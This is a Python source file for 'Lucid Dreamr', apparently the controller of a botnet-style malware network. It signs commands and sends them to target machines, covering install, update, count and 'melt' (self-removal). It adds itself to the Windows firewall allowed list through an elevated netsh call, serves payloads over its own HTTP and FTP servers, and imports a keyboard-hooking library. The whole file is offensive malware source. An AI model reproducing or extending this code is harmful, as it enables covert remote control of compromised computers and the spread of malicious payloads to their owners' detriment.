#!C:\Python27\python.exe
import pythoncom, pyHook
import os
import sys
import datetime,time
import win32event, win32api, winerror
import socket
import random
import win32com.shell.shell as win32shell
import hashlib

DRM_TRUSTED_PUBLIC = '''-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----'''
DRM_TRUSTED_PRIVATE = '''-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----
'''

### make web dir ###
try:
	if not os.path.isdir("www"):
		os.mkdir("www")
except Exception as e:
	pass


### make cert dir ###
try:
	if not os.path.isdir("cert"):
		os.mkdir("cert")
except Exception as e:
	pass

time.sleep(3)

# Local Include
from config import *
# Init lucid context
from Context import Dreamr
Dreamr.startCrypto(DRM_TRUSTED_PUBLIC, DRM_TRUSTED_PRIVATE)

print("Lucid Dreamr %s" % VERSION)
BinaryLocation = sys.argv[0]
print("In this dream you are the lucid dreamr.")

# Check mutex to detect multilaunch
mutex = win32event.CreateMutex(None, 1, 'lucid-dreamr')
if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
	mutex = None
	os._exit(420)

from core import *

print("issue command: lucid-dreamr.exe <Selector Type> <Selector Value> <Command Type> <Command Payload> <Target IP Address> <Return Address>")
win32shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe", lpParameters=("/c netsh firewall add allowedprogram \"%s\" \"Lucid Dreamr\" ENABLE" % sys.argv[0]))
msgSender = socket.gethostbyname(socket.gethostname())

# Handle signing and injecting commands into the network
if (len(sys.argv) == 7):
	selectorType = int(sys.argv[1])
	selectorValue = int(sys.argv[2])
	msgType = int(sys.argv[3])
	msgData = sys.argv[4]
	msgDest = str(sys.argv[5])
	msgReturn = str(sys.argv[6])

	if (msgReturn == msgSender):
		from http import *
		from ftp import *
		WebThread(WebPath).start()
		FTPServer(WebPath).start()

	# Do some checks
	if (selectorType > 2):
		print("bad selector type")
		os._exit(421)

	if (msgType >= 20 and msgType <= 50):
		#print("msgData = '%s'" % msgData)
		msgData = [selectorType, selectorValue, int(time.time()), msgData, msgData] # The last param is usually just a string. easier to override for cmds that don't accept a string

		### COMMAND OVERRIDES ###
		if (msgType == TYPE_COUNT_REQUEST):
			msgData[4] = "count"

		if (msgType == TYPE_MELT):
			msgData[4] = "bye"

		if (msgType == TYPE_UPDATE or msgType == TYPE_INSTALL):
			from collect import *
			Collect(WebPath, msgData[3], msgDest).start()
			time.sleep(3)
			msgData[4] = hashlib.sha1(open(msgData[3], "rb").read()).hexdigest()
	
	from protocol import *
	ProtocolThread([msgDest, msgType, msgData, msgReturn]).start()